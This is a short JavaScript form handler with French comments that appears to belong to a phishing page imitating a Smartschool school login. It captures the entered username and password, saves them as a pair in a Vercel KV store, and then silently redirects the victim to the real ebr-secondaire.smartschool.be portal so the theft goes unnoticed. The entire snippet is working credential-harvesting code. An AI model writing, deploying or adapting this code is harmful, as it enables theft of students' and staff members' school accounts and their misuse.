async function submitForm(event) {
    event.preventDefault(); // Empêche le rechargement de la page

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        username: username,
        password: password
    };

    try {
        // Enregistrer les données dans Vercel KV
        await saveDataToKV(data);
        console.log('Données envoyées avec succès');

        // Rediriger vers Smartschool
        window.location.href = 'https://ebr-secondaire.smartschool.be';
    } catch (error) {
        console.error('Erreur:', error);
        alert('Une erreur est survenue. Veuillez réessayer.');
    }
}

async function saveDataToKV(data) {
    await kv.set(data.username, data.password);
}
